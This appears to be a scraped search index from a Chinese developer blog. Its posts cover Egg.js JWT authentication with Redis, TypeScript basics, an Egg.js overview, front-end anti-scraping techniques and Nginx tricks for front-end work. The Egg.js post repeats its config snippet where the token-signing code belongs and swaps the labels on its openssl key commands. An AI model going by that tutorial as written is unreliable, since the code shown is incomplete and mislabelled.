123456// 启动/etc/init.d/redis-server start// 停用/etc/init.d/redis-server stop// 重启/etc/init.d/redis-server restart 使用docker 安装redis123456789101112// 下载版本docker pull redis // 默认会拉取最新版本的redis docker images // 查看镜像是否安装成功docker run -itd --name redis-test -p 6379:6379 redis // 启动redis容器 端口号为6379docker start redis-test // 启动redisdocker stop redis-test // 关闭redisdocker restart redis-test // 重启redis eggjs 环境下使用redis和jsonwebtoken实现token验证1npm install jsonwebtoken middleware中间件​ jwt.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445&#x27;use strict&#x27;const fs = require(&#x27;fs&#x27;)const path = require(&#x27;path&#x27;)const jwt = require(&#x27;jsonwebtoken&#x27;) //引入jsonwebtokenmodule.exports = (options, app) =&gt; &#123; return async function userInterceptor(ctx, next) &#123; let authToken = ctx.header.authorization // 获取header里的authorization if (authToken) &#123; authToken = authToken.substring(7) const res = verifyToken(authToken) // 解密获取的Token if (res.corpid &amp;&amp; res.userid) &#123; // 如果需要限制单端登陆或者使用过程中废止某个token，或者更改token的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效 // 此处使用redis进行保存 const redis_token = await app.redis.get(&#x27;loginToken&#x27;).get(res.corpid + res.userid) // 获取保存的token if (authToken === redis_token) &#123; ctx.locals.corpid = res.corpid ctx.locals.userid = res.userid await next() &#125; else &#123; ctx.body = &#123; code: 50012, msg: &#x27;您的账号已在其他地方登录&#x27; &#125; &#125; &#125; else &#123; ctx.body = &#123; code: 50012, msg: &#x27;登录状态已过期&#x27; &#125; &#125; &#125; else &#123; ctx.body = &#123; code: 50008, msg: &#x27;请登陆后再进行操作&#x27; &#125; &#125; &#125;&#125;// 解密，验证function verifyToken(token) &#123; const cert = fs.readFileSync(path.join(__dirname, &#x27;../public/rsa_public_key.pem&#x27;)) // 公钥，看后面生成方法 let res = &#x27;&#x27; try &#123; const result = jwt.verify(token, cert, &#123; algorithms: [ &#x27;RS256&#x27; ] &#125;) || &#123;&#125; const &#123; exp &#125; = result, current = Math.floor(Date.now() / 1000) if (current &lt;= exp) res = result.data || &#123;&#125; &#125; catch (e) &#123; console.log(e) &#125; return res&#125; 使用中间件12345678910111213// 方法一：在应用中使用中间件config.middleware = [ &#x27;jwt&#x27; ]config.jwt = &#123; enable: true, ignore: [ &#x27;/api/v1/test/&#x27;, &#x27;/public/&#x27; ], // 哪些请求不需要认证&#125;// 方法二：router中使用中间件module.exports = app =&gt; &#123; const jwt = app.middleware.jwt(); app.router.get(&#x27;/api/v1/test/&#x27;, jwt, app.controller.test.test);&#125;; 生成token​ 写在helper里面，方便调用 1234567891011121314151617181920// 方法一：在应用中使用中间件config.middleware = [ &#x27;jwt&#x27; ]config.jwt = &#123; enable: true, ignore: [ &#x27;/api/v1/test/&#x27;, &#x27;/public/&#x27; ], // 哪些请求不需要认证&#125;config.redis = &#123; client: &#123; host: &#x27;127.0.0.1&#x27;, port: &#x27;6379&#x27;, password: &#x27;&#x27;, db: 0, &#125;, &#125;;// 方法二：router中使用中间件module.exports = app =&gt; &#123; const jwt = app.middleware.jwt(); app.router.get(&#x27;/api/v1/test/&#x27;, jwt, app.controller.test.test);&#125;; ​ 调用token生成方式 12345678910111213// 方法一：在应用中使用中间件config.middleware = [ &#x27;jwt&#x27; ]config.jwt = &#123; enable: true, ignore: [ &#x27;/api/v1/test/&#x27;, &#x27;/public/&#x27; ], // 哪些请求不需要认证&#125;// 方法二：router中使用中间件module.exports = app =&gt; &#123; const jwt = app.middleware.jwt(); app.router.get(&#x27;/api/v1/test/&#x27;, jwt, app.controller.test.test);&#125;; 利用openssl生成私钥和公钥12生成公钥：openssl genrsa -out rsa_private_key.pem 1024 生成私钥: openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem","tags":[{"name":"eggjs","slug":"eggjs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/eggjs/"},{"name":"jsonwebtoken","slug":"jsonwebtoken","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/jsonwebtoken/"},{"name":"redis","slug":"redis","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/redis/"},{"name":"deepin","slug":"deepin","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/deepin/"}]},{"title":"typescript 学习质量 - 01","date":"2020-04-08T01:10:06.000Z","path":"2020/04/08/typescript-study-01/","text":"参考文章:廖雪峰 typescript入门教程 数据类型原始数据类型 boolean 布尔值1234567let isDone: boolean = false;// 注意:使用构造函数Boolean创建的对象不是布尔值let createdByNewBoolean: boolean = new Boolean(1);// Type &#x27;Boolean&#x27; is not assignable to type &#x27;boolean&#x27;.// &#x27;boolean&#x27; is a primitive, but &#x27;Boolean&#x27; is a wrapper object. Prefer using &#x27;boolean&#x27; when possible.// 实际上new Boolean 返回的是一个boolean对象 number 数值定义 string 字符串定义 void 空值声明一个void类型的变量 只能赋值为undefined和null null undefinednull 和 undefined 是所有类型的子类型 任意值 any 如果是一个普通类型,在复制过程中改变变量类型是不允许的,但是any类型允许被赋值为任意类型. 在任意值上访问任何属性都是允许的,也可以调用任何方法 变量如果在声明时,未指定类型,将会被识别为任意值 如果没有明确指定类型,typescript会按照类型推论的规则，推断出一个类型如果定义的时候没有复制，不管之后有没有复制，都会被推断成any类型而不被检查 联合类型 12let myFavoriteNumber: string | number;// myFavoritNumber 可以取字符串类型和数值类型的一种 当typescript不确定一个联合类型的变量是哪个变量的时候，只能访问此联合类型的所有类型里共有的属性和方法123function getString(something: string | number): string &#123; return something.toString();&#125;定义的联合类型的变量在被赋值的时候，会根据类型推论规则推断出一个类型 接口什么是接口接口是对行为的抽象，具体如何行动需要由类(classes)去实现(implement)typescript 中的接口是一个十分灵活的概念，除了可以用于对类的一部分行为进行抽象以外，也常用于对[对象的形状(shape)]进行描述 123456789interface Person &#123; name: string; age: number;&#125;let tom: Person = &#123; name: &#x27;Tom&#x27;, age: 25&#125;; 接口一般首字母大写，建议接口的名称上加上I前缀定义的变量和接口属性不同是不允许的 可选属性又是完美希望不要完全匹配一个形状，那么可用可选属性 12345678interface Person &#123; name: string; age?: number;&#125;let tom: Person = &#123; name: &#x27;Tom&#x27;&#125;; 可选属性的含义是该属性可以不存在这是仍然不允许添加未定义的属性 任意属性 如果希望一个接口允许有任意属性，可以使用如下方式12345678910interface Person &#123; name: string; age?: number; [propName: string]: any;&#125;let tom: Person = &#123; name: &#x27;Tom&#x27;, gender: &#x27;male&#x27;&#125;;使用[propNmae: string]定义了任意属性去string类型的值一旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集 也就是值的属性需要和任意值的属性相同，如果不同则会报错 一个接口只能定义一个任意属性，如果接口中有多个类型的属性，则可以在任意属性中使用联合类型1234567891011interface Person &#123; name: string; age?: number; [propName: string]: string | number;&#125;let tom: Person = &#123; name: &#x27;Tom&#x27;, age: 25, gender: &#x27;male&#x27;&#125;;只读属性 readonly readonly 属性需要在初始化对象的时候赋值只读的约束存在于第一次给对象赋值的时候，而不是第一次给只读属性赋值的时候 数组1let list: any[] = [&#x27;lxx&#x27;, 24, &#123;age: 30&#125;] 函数类型在javascript中有两种常见的定义函数的方式—-函数声明和函数表达式 1234567// 函数声明 Function Declarationfunction sum(x,y) &#123;&#125;// 函数表达式let one = function() &#123;&#125; 一个函数有输入和输出，要在TypeScript 中对其进行约束，需要把输入和输出都考虑到，其中函数声明的类型比较简单。输入多余的(或者少于要求的)参数是不被允许的 函数表达式 123456789 // 第一种 let sum = function(x: number, y number): number &#123; &#125; // 第一种方法只对等号右侧的匿名函数进行了类型定义，而等号左边的mysum，是通过复制操作进行类型推论而推断出来的 // 第二种 推介 let sum: (x: number, y:number) =&gt; number = function(x: number, y number): number &#123;&#125; typescript中的 =&gt; 和es6中的=&gt; 代表的含义不同typescript中 =&gt;表示函数的定义，左侧是输入类型，需要用括号括起来，右边是输出类型 接口定义函数 1234567interface SearchFunc &#123; (source: string, subString: string): boolean&#125;let mySearch: SearchFuncmySearch = function(source: string, subString: string) &#123; return source.search(subString) !== -1;&#125; 采用函数表达式|接口定义函数的方式时，对等号左侧进行类型限制，可以保证以后对函数名赋值时保证参数个数，参数类型，返回值类型不变 可选参数用?表示可选参数 123456789function buildName(firstName: string, lastName?: string) &#123; if (lastName) &#123; return firstName + &#x27; &#x27; + lastName; &#125; else &#123; return firstName; &#125;&#125;let tomcat = buildName(&#x27;Tom&#x27;, &#x27;Cat&#x27;);let tom = buildName(&#x27;Tom&#x27;); 可选参数必须就在必需参数后面，可选参数后面不允许在出现必须参数 参数默认值typescript 会将添加了默认值的参数识别为可选参数，如果不传参，将会设置为默认值 剩余参数ES6中可以使用...rest 方式 获取函数中的剩余参数 剩余参数只能是最后一个参数 重载 1234567function reverse(x: number | string): number | string &#123; if (typeof x === &#x27;number&#x27;) &#123; return Number(x.toString().split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)); &#125; else if (typeof x === &#x27;string&#x27;) &#123; return x.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;); &#125; &#125; 表达不够精确，输入为数字的时候，输出也应该是数字这时可以使用重载定义多个reverse的函数类型123456789function reverse(x: number): number; function reverse(x: string): string; function reverse(x: number | string): number | string &#123; if (typeof x === &#x27;number&#x27;) &#123; return Number(x.toString().split(&#x27;&#x27;).reverse().join(&#x27;&#x27;)); &#125; else if (typeof x === &#x27;string&#x27;) &#123; return x.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;); &#125; &#125;TypeScript会有限从最前面的函数定义开始匹配，多个函数定义如果有包含关系，需要优先把精确的定义写在前面 类型断言123值 as 类型or&lt;类型&gt;值 类型断言可以用来手动指定一个值的类型 将一个联合类型断言为其中一个类型 当typescript不确定一个联合类型的变量到底是哪个类型的时候，我们只能访问此联合类型的所有类型的共有的属性和方法 如果我们需要在还不确定类型的时候就访问其中一个类型特有的属性和方法此时可以使用类型断言，将animal断言成fish123456789101112131415interface Cat &#123; name: string, run(): void&#125;interface Fish&#123; name: String, swim(): void&#125;function isFish(animal: Cat|Fish) &#123; if(typeof (animal as Fish).swim === &#x27;function&#x27;) &#123; return true &#125; return false&#125; 注意：类型断言只能欺骗typescript编译器，无法避免运行时的错误，反而滥用类型断言可能会导致运行时错误在使用类型断言的时候，如果没有使用公共方法，如果传入类型变化，就会导致运行错误使用类型断言的时候要格外小心，尽量避免断言后调用方法或者引用深层属性，减少不必要的运行时错误 将一个父类断言为更加具体的子类123456789101112class ApiError extends Error &#123; code: number = 0;&#125;class HttpError extends Error &#123; code: number = 200;&#125;function isApiError(error:Error) &#123; if(typeof (error as ApiError).code === &#x27;number&#x27;) &#123; return true &#125; return false&#125; 上面的例子 因为ApiError 和HttpError是一个类 还可以通过instanceof 来判断error是否是它的实例 但是有的时候ApiError 和HttpError不是一个类，而是一个接口(interface) 接口是一个类型，不是一个真正的值，在编译的结果中会被删除，无法使用instanceof 来做运行时判断 将任何一个类型断言为any 当我们引用一个在此类型上不存在的属性和方法时，就会报错，这时可以使用as any 临时断言为any类型在any类型的变量上，访问任何属性都是允许的，将一个变量断言为any 是解决typescript中类型问题的最后一个手段， 它极有可能掩盖了真正的类型错误 将any断言为一个具体的类型在日常代码操作时，遇到any类型的变量，可以选择无视它，任由滋生更多的any，也可以选择改进它，通过类型断言及时吧any断言为精确的类型，使我们的代码向着高可维护性的目标发展 1234567891011function getCacheData(key: string): any &#123; return (window as any).cache[key];&#125;interface Cat &#123; name: string; run(): void;&#125;const tom = getCacheData(&#x27;tom&#x27;) as Cat;tom.run() 类型断言限制 联合类型可以被断言为其中一个类型 父类可以被断言为子类 任何类型都可以被断言为any any可以被断言为任何类型 要使得A能被断言为B，只需要A兼容B或B兼容A但是并不是任何一类型都可以被断言为任何另一个类型eg:12345678910111213interface Animal &#123; name: string;&#125;interface Cat &#123; name: string; run(): void;&#125;let tom: Cat = &#123; name: &#x27;Tom&#x27;, run: () =&gt; &#123;console.log(&#x27;run&#x27;)&#125;&#125;let animal: Animal = tom typescript 是结构类型系统，类型之间的对比只会比较最终的结构，而会忽略他们定义时的关系上面的这个例子，Cat包含了 Animal中的所有属性，除此之外，还有一个额外的方法run，typescript并不关心Cat和Animal之间定义的时是什么关系，智慧看他们最终的结构有什么关系，所以与Cat extends Animal是等价的 如果animal 兼容 Cat时，他们就可以互相进行类型断言 允许Animal as Cat是因为父类可以被断言为子类 允许Cat as Animal因为既然子类拥有父类的属性和方法，那么被断言为父类，获取父类的属性，调用父类的方法不会出现问题，故子类可以被断言为父类 双重断言 任何类型都可以被断言为any any可以被断言为任何类型12345678910interface Cat &#123; run(): void;&#125;interface Fish &#123; swim(): void;&#125;function testCat(cat: Cat) &#123; return (cat as any as Fish);&#125; 上面这个例子中，如果直接使用cat as Fish,肯定会报错,因为Cat和Fish不兼容 这时候如果使用双重断言 价格任何一个类型断言为任何另一个类型但是双重断言可能会导致运行时错误除非迫不得已,千万不要使用双重断言 类型断言 VS 类型转换类型断言智慧影响TypeScript编译时的类型,编译完成后,类型断言语句会被删除 123456function toBoolean(something: any): boolean &#123; return something as boolean;&#125;toBoolean(1);// 返回值为 1 所以类型断言不是类型转换,不会影响到变量的类型如果要进行类型转换,直接调用类型转换方法123456function toBoolean(something: any): boolean &#123; return Boolean(something);&#125;toBoolean(1);// 返回值为 true 类型断言 VS类型声明1234567891011function getCacheData(key: string): any &#123; return (window as any).cache[key];&#125;interface Cat &#123; name: string; run(): void;&#125;const tom = getCacheData(&#x27;tom&#x27;) as Cat;tom.run(); 使用as Cat 将any类型断言为Cat类型也可以通过类型声明的方法将tom声明为Cat，然后再将ay类型的getCacheData(&#39;tom&#39;)赋值给Cat类型的tom类型声明比类型断言更加严格，因此为了增加代码质量，优先使用类型声明，这也比类型断言的as语法更加优雅 类型断言 VS 泛型我们还有第三种方式可以解决这个问题，那就是泛型：1234567891011function getCacheData&lt;T&gt;(key: string): T &#123; return (window as any).cache[key];&#125;interface Cat &#123; name: string; run(): void;&#125;const tom = getCacheData&lt;Cat&gt;(&#x27;tom&#x27;);tom.run();通过给 getCacheData 函数添加了一个泛型 ，我们可以更加规范的实现对 getCacheData 返回值的约束，这也同时去除掉了代码中的 any，是最优的一个解决方案。 声明文件 declare var 声明全局变量 declare function 声明全局方法 declare class 声明全局类 declare enum 声明全局枚举 declare namespace 声明（含有子属性的）全局对象 interface和type声明全局类型 export 导出变量 export namespace 导出（含有子属性的）对象 export default ES6默认导出 export = commonjs导出模块 export as namespace UMD库声明全局变量 declare global 扩展全局变量 declare module 扩展模块 /// 三斜线指令 什么是声明语句eg：当我们要使用一些第三方库的时候，在ts中，编译器并不知道他们是什么东西，这时候就需要使用declare var 来定义他的类型 123declare var jQuery: (selector: string) =&gt; anyjQuery(&#x27;#foo&#x27;) declare var 并没有真正的定义一个变量，只是定义了全局变量jQuery的类型，仅仅会用于编译时的检查，在编译结果中会被删除 什么是声明文件 通常会把声明语句放到一个单独的文件（jQuery.d.ts）中，这就是声明文件 12345// jquery.d.tsdeclare var jQuery: (selector: string) =&gt; any// index.tsjQuery(&#x27;#foo&#x27;) 声明文件必须以.d.ts为后缀ts会解析项目中所有的*.ts文件，当然也包含以.d.ts结尾的文件。所以我们将jQuery.d.ts放到项目中，其他所有*.ts文件就可以获得jQuery的类型定义 第三方声明文件 推介使用@types统一管理第三方库的声明文件,直接用npm安装对应的声明模块即可1npm install @types/jquery --save-dev 全局变量 declare var 用来定义给全局变量的类型 declare let declare const 同理,声明语句中只能定义类型，切勿在声明语句中定义具体的实现declare const 不允许再次修改值 declare function 定义全局函数的类型在函数类型的声明语句中,函数重载也是支持的12345678910// src/jQuery.d.tsdeclare function jQuery(selector: string): any;declare function jQuery(domReadyCallback: () =&gt; any): any;// src/index.tsjQuery(&#x27;#foo&#x27;);jQuery(function() &#123; alert(&#x27;Dom Ready!&#x27;);&#125;); declare class 当全局变量是一个类,我们用declare class 来定义他的类型declare class 语句也只能用来定义类型,不能用来定义具体的体现 12345678910// src/Animal.d.tsdeclare class Animal &#123; name: string; constructor(name: string); sayHi(): string;&#125;// src/index.tslet cat = new Animal(&#x27;Tom&#x27;); *declare enum 外部枚举 1234567891011// src/Directions.d.tsdeclare enum Directions &#123; Up, Down, Left, Right&#125;// src/index.tslet directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]; 与全局变量类型声明一致,declare enum 仅用来定义类型,而不是具体的值 declare namespacenamespace 是ts早期为了解决模块化而创造的关键字,中文称命名空间我们应该使用declare namespace jQuery 来声明拥有多个子属性的全局变量12345678// src/jQuery.d.tsdeclare namespace jQuery &#123; function ajax(url: string, settings?: any): void;&#125;// src/index.tsjQuery.ajax(&#x27;/api/get_something&#x27;); 在delcare namespace 内部,我们也可以直接使用function ajax来声明哈数,而不是使用delcare function ajax 也可以使用const, class, enum等语句嵌套的命名空间如果对象拥有深层的层级,则需要使用嵌套的namespace来声明深层的属性类型 12345678910111213141516// src/jQuery.d.tsdeclare namespace jQuery &#123; function ajax(url: string, settings?: any): void; namespace fn &#123; function extend(object: any): void; &#125;&#125;// src/index.tsjQuery.ajax(&#x27;/api/get_something&#x27;);jQuery.fn.extend(&#123; check: function() &#123; return this.each(function() &#123; this.checked = true; &#125;); &#125;&#125;); 当然,如果jQuery下仅有fn这一个属性 则不需要嵌套namespace 123456789101112// src/jQuery.d.tsdeclare namespace jQuery.fn &#123; function extend(object: any): void;&#125;// src/index.tsjQuery.fn.extend(&#123; check: function() &#123; return this.each(function() &#123; this.checked = true; &#125;); &#125;&#125;); interface &amp;&amp; type 使用interface和type来声明一个全局的接口或者类型","tags":[]},{"title":"eggjs-start","date":"2020-03-25T11:41:08.000Z","path":"2020/03/25/eggjs-start/","text":"eggjs 定义设计原则​ egg的产检机制有很高的可扩展性，一个插件只做意见事情，egg通过框架聚合这些插件，并根据自己的业务场景定制配置，可以降低应用的开发成本 其他框架的差异express​ express是node.js社区广泛使用的框架，简单且扩展性强，适合做个人项目，但框架本身缺少约定，标准的MVC模型会有各种千奇百怪的写法，egg按照约定进行开发，奉行约定优先配置，团队协作成本低 sails​ sails和egg一样奉行【约定优与配置】的框架，扩展性也非常好，但是相比egg，sails支持Blueprint REST API、WhaterLine这样可扩展的ORM、前端集成、websocket等，但是这些功能都是优Sails提供的，但egg不直接提供功能，只是集成各种功能插件，比如实现egg’-blueprint,egg-waterline这样的插件，在使用sails-egg框架整合这些插件 特性 提供基于egg定制上层框架的能力 高度可扩展的插件机制 内置多进程管理 基于Koa开发，性能优异 框架稳定，测试覆盖率高 渐进式开发 异步编程模型​ nodejs是一个异步的世界，官方API支持的都是以callback的形式的异步编程模型，这种会存在一些问题 callback hell: 最臭名昭著的callback嵌套问题 release zalgo: 异步函数中可能同步调用callback返回数据，带来不一致性 ​ 异步解决方案 promise async function 在async function中，我们可以通过await关键字等待一个Promise被resolve 123456const fn = async function() &#123; const user = await getUser(); const posts = await fetchPosts(user.id); return &#123; user, posts &#125;;&#125;;fn().then(res =&gt; console.log(res)).catch(err =&gt; console.error(err.stack)); Koa​ koa 是一个新的web框架，由express幕后原班人马打造，致力于成为web应用和api开发领域中的一个更小更富有表现力更健壮基石 middleware​ 中间件，所有请求经过一个中间件的时候都会执行两次，koa模型可以非常方便的实现后置处理逻辑 context​ 和express只有request和response两个对象不同，koa增加了一个context的对象，作为这次请求的上下文对象，我们可以把一次请求相关的上下文都挂载到这个对象上 ​ 同时context上也挂在了request和response两个对象，提供了大量的便捷方式辅助开发 1234get request.queryget request.hostnameset response.bodyset response.status 异常处理​ 通过同步方式编写异步代码带来的另外一个非常大的好处就是异常处理，使用try…catch就可以将按照规范编写的代码的所有错误都可以捕获到，这样我们可以很便捷的编写一个自定义的错误处理中间件 123456789async function onerror(ctx, next) &#123; try &#123; await next(); &#125; catch (err) &#123; ctx.app.emit(&#x27;error&#x27;, err); ctx.body = &#x27;server error&#x27;; ctx.status = err.status || 500; &#125;&#125; ​ 只需要将这个中间件放到其他中间件之前，就可以捕获它们所有的同步或者异步代码中抛出的异常 扩展​ 在基于egg的框架或者应用中，我们可以通过定义 app/extend/{application,content,request,response}.js来扩展koa中对应的四个对象圆形，可以快速增加更多的辅助方法，列入在app/extend/context.js中写入一下代码 1234567// app/extend/context.jsmodule.exports = &#123; get isIOS() &#123; const iosReg = /iphone|ipad|ipod/i; return iosReg.test(this.get(&#x27;user-agent&#x27;)); &#125;,&#125;; ​ 在controller中，我们就可以使用到刚才定义的这个便捷属性了 123456// app/controller/home.jsexports.handler = ctx =&gt; &#123; ctx.body = ctx.isIOS ? &#x27;Your operating system is iOS.&#x27; : &#x27;Your operating system is not iOS.&#x27;;&#125;; 插件​ 在express和koa中，经常会引入许许多多的中间件来提供各种各样的功能，列入引入koa-session提供session的支持，引入koa-bodyparser来解析请求body，egg提供一共更加强大的插件机制，让这些地理领域的功能模块可以更加容易编写 extend：扩展基础对象上下文，提供各种工具类和属性 middleware：增加一共或多个中间件，提供请求的前置和后置处理逻辑 config：配置各个环境下插件自身的默认配置项","tags":[{"name":"eggjs","slug":"eggjs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/eggjs/"},{"name":"nodejs","slug":"nodejs","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/nodejs/"},{"name":"后台","slug":"后台","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E5%90%8E%E5%8F%B0/"}]},{"title":"反击爬虫，前端工程师的脑洞可以有多大？","date":"2017-07-09T02:36:00.000Z","path":"2017/07/09/prevent-spiders/","text":"—— 同时发表于imweb.io 1. 前言对于一张网页，我们往往希望它是结构良好，内容清晰的，这样搜索引擎才能准确地认知它。而反过来，又有一些情景，我们不希望内容能被轻易获取，比方说电商网站的交易额，教育网站的题目等。因为这些内容，往往是一个产品的生命线，必须做到有效地保护。这就是爬虫与反爬虫这一话题的由来。 2. 常见反爬虫策略但是世界上没有一个网站，能做到完美地反爬虫。 如果页面希望能在用户面前正常展示，同时又不给爬虫机会，就必须要做到识别真人与机器人。因此工程师们做了各种尝试，这些策略大多采用于后端，也是目前比较常规单有效的手段，比如： User-Agent + Referer检测 账号及Cookie验证 验证码 IP限制频次 而爬虫是可以无限逼近于真人的，比如： chrome headless或phantomjs来模拟浏览器环境 tesseract识别验证码 代理IP淘宝就能买到 所以我们说，100%的反爬虫策略？不存在的。更多的是体力活，是个难易程度的问题。 不过作为前端工程师，我们可以增加一下游戏难度，设计出一些很(sang)有(xin)意(bing)思(kuang)的反爬虫策略。 3. 前端与反爬虫3.1 font-face拼凑式例子：猫眼电影 猫眼电影里，对于票房数据，展示的并不是纯粹的数字。页面使用了font-face定义了字符集，并通过unicode去映射展示。也就是说，除去图像识别，必须同时爬取字符集，才能识别出数字。 并且，每次刷新页面，字符集的url都是有变化的，无疑更大难度地增加了爬取成本。 3.2 background拼凑式例子：美团 与font的策略类似，美团里用到的是background拼凑。数字其实是图片，根据不同的background偏移，显示出不同的字符。 并且不同页面，图片的字符排序也是有区别的。不过理论上只需生成0-9与小数点，为何有重复字符就不是很懂。 页面A：页面B： 3.3 字符穿插式例子：微信公众号文章 某些微信公众号的文章里，穿插了各种迷之字符，并且通过样式把这些字符隐藏掉。这种方式虽然令人震惊…但其实没有太大的识别与过滤难度，甚至可以做得更好，不过也算是一种脑洞吧。 对了，我的手机流量可以找谁报销吗？ 3.4 伪元素隐藏式例子：汽车之家 汽车之家里，把关键的厂商信息，做到了伪元素的content里。这也是一种思路：爬取网页，必须得解析css，需要拿到伪元素的content，这就提升了爬虫的难度。 3.5 元素定位覆盖式例子：去哪儿 还有热爱数学的去哪儿，对于一个4位数字的机票价格，先用四个i标签渲染，再用两个b标签去绝对定位偏移量，覆盖故意展示错误的i标签，最后在视觉上形成正确的价格… 这说明爬虫会解析css还不行，还得会做数学题。 3.6 iframe异步加载式例子：网易云音乐 网易云音乐页面一打开，html源码里几乎只有一个iframe，并且它的src是空白的：about:blank。接着js开始运行，把整个页面的框架异步塞到了iframe里面… 不过这个方式带来的难度并不大，只是在异步与iframe处理上绕了个弯（或者有其他原因，不完全是基于反爬虫考虑），无论你是用selenium还是phantom，都有API可以拿到iframe里面的content信息。 3.7 字符分割式例子：全网代理IP 在一些展示代理IP信息的页面，对于IP的保护也是大费周折。 他们会先把IP的数字与符号分割成dom节点，再在中间插入迷惑人的数字，如果爬虫不知道这个策略，还会以为自己成功拿到了数值；不过如果爬虫注意到，就很好解决了。 3.8 字符集替换式例子：去哪儿移动侧 同样会欺骗爬虫的还有去哪儿的移动版。 html里明明写的3211，视觉上展示的却是1233。原来他们重新定义了字符集，3与1的顺序刚好调换得来的结果…","tags":[{"name":"安全","slug":"安全","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E5%AE%89%E5%85%A8/"},{"name":"前端","slug":"前端","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E5%89%8D%E7%AB%AF/"}]},{"title":"Nginx能为前端开发带来什么？","date":"2015-11-03T13:30:00.000Z","path":"2015/11/03/nginx-in-fe/","text":"Nginx那么好，我想去看看。接连逛了两个书城后，我发现并没有Nginx相关的书籍。这就很奇怪！ Nginx，一名网红（网络服务器红人…），就算没有自传和回忆录，争着介绍它的花边新闻也该有吧。 后来找到仅有的一两本书籍，也直接深入到“源码剖析”的阶段。写得并不十分满意，况且我还不需要这些。后来发现了原因，大概是因为“使用太简单了，都不值得出书”。是的，Nginx把纷繁复杂的功能，浓缩成一份简单的配置，极易上手。当它呈现到你面前时，感觉独具匠心。 Nginx与NodeJs（这里的标题有点歧义。此处的NodeJs，皆引申为NodeJs所搭建的服务器。） 有人说，作为一名前端，我的真爱是NodeJs。同时也认同，抛去性能之类的比较，单纯从实现的角度，NodeJs编写的服务器也能实现Nginx的各种功能。 这些我都赞成，但使用Nginx并不意味着抛弃NodeJs。事实上，它们并不冲突，还可以在一起愉快的玩耍。 在业内，这样的模型已很常见：资源转发，反向代理，静态资源处理，负载均衡，这些事情扔给Nginx来处理，只是几行配置的事情；同时在上游，让NodeJs去处理它最擅长的I/O等事情。 合理分配各自擅长的事情，这样的思路，同样可以运用于前端开发中。 以前用NodeJs几百行实现的服务器功能，在npm与github的海洋里花尽心思去寻找的模块，也许在Nginx里是一条成熟的配置。它能帮其分担很多事情，节约了成本。 场景一：环境切换前端开发中，经常面临多个部署环境切换的问题。我们通常用配hosts的方式去实现。更优化些，我们将机器的服务绑定了不同的域名：比如正式环境是a.qq.com，测试环境是test.a.qq.com。 然而在拓展性和易用性方面，还不足够好。而Nginx作为反向代理，就很容易处理资源转发的问题。 思路很简单： 读取请求里的cookie，如果键名host_id有值，则代理到这个IP地址； 如果没有，则代理到默认的正式环境（此处举例为1.1.1.1）; 123456789set $env_id &quot;1.1.1.1&quot;;if ( $http_cookie ~* &quot;host_id=(\\S+)(;.*|$)&quot;) &#123; set $env_id $1;&#125;location / &#123; proxy_set_header Host $host; proxy_pass http://$env_id:80;&#125; 那接下来的事情，就是怎样用最简便的方式，把IP种在cookie里？我们应用了nginx-http-footer-filter模块，html文件经过代理时，都注入了一小段js代码。 这段代码，会帮我们展示小菜单，点击某个环境时，则将IP种到cookie里，同时刷新页面，让Nginx完成环境切换。 切换环境，如今只需点击一次。 场景二：SourceMap在线上环境调试Js代码是件麻烦的事情，因为目前合格的前端部署，代码都应经过压缩。性能问题是优化了，debug可不怎么方便。 而SourceMap正好可以解决此问题。 在最新的各版本浏览器里，如果满足： 压缩后的js文件后面有//# sourceMappingURL=xxx.map格式的注释 浏览器能正常访问到sourceMappingURL 那么，就能把压缩过的代码还原。要实现这样的功能，就必须： 现网环境不带以上形式的注释，同时访问不到sourceMap（安全性考虑） 测试环境带注释，能访问sourceMap 这样的模型，用反向代理+内容纂改的思路再合适不过。每次构建编译时，我们会把sourceMap文件存放到一台机器（举例为1.1.1.1），命名为js文件名后加.map后缀。随后，使用Nginx，通过这几行配置就能把此功能实现： 1234location ~ \\.js$ &#123; footer &quot;\\n//# sourceMappingURL=$request_uri.map&quot;; footer_types &quot;*&quot;;&#125; 只要经过代理，在chrome里，我们能看到每份被压缩过的js文件，都有一个对应的源码文件。你可以直接使用它来做打断点之类的操作，大大的提升了调试质量。 场景三：内容纂改其实在以上两个场景里，都涉及了“内容纂改”。无论是说“纂改”还是“劫持”，大家的印象都不是什么好事情，但另一方面，他们又可以让事情有趣起来。 统一介绍下，Nginx涉及纂改的模块有： nginx_http_footer_filter：往文件的底部添加文字，可包含Nginx的内置变量； nginx_http_addition_module：从一个url去读取内容，将之添加到文件的头部或顶部； nginx_http_sub_module：替换字符 除去上面两种场景，合理运用这些模块对应的配置，可以做出许多小工具，这是很有想象力的事情。单单针对移动web前端开发，就可以实现： 将weinre脚本插入到html里，让移动web调试更加便捷。 移动web经常用到localStorage优化首屏，但debug时又会受到干扰，通过一个按钮很方便的清除本地缓存。 手机APP内嵌页面，很难将其网址分享给另一个人。通过一个按钮就能生成url对应的二维码等 场景四：本地映射在Windows下的前端抓包调试，Fiddler+Willow的能力毋庸置疑。而脱离了.NET体系的Linux和Mac，即使有一些代替工具，但某些方面还是略显不足。 比如：线上接口映射到本地文件。想到Fiddler的本质也是一个代理，而开启一个有这样能力的Nginx服务，并不是太难的事情。 而且，我们可以做得更灵活，比如： 同时支持慢速调试 同时支持目录层级映射 同时支持正则匹配 JSON返回的数据有可能是变化的（比如分页时候），同时支持动态数据 这些场景，只运用到Nginx里的“rewrite规则”。从参考的文档可以大致看到，rewrite规则非常灵活，能完成各种场景的转发。 最简单的模型中，我们把所有带cgi-bin路径的请求，rewite到本地的一个服务，同时带上请求的所有参数，仅需这三行配置即可：123location ~ /cgi-bin/* &#123; rewrite ^(.*)$ http://127.0.0.1:8080/cgi-bin/ 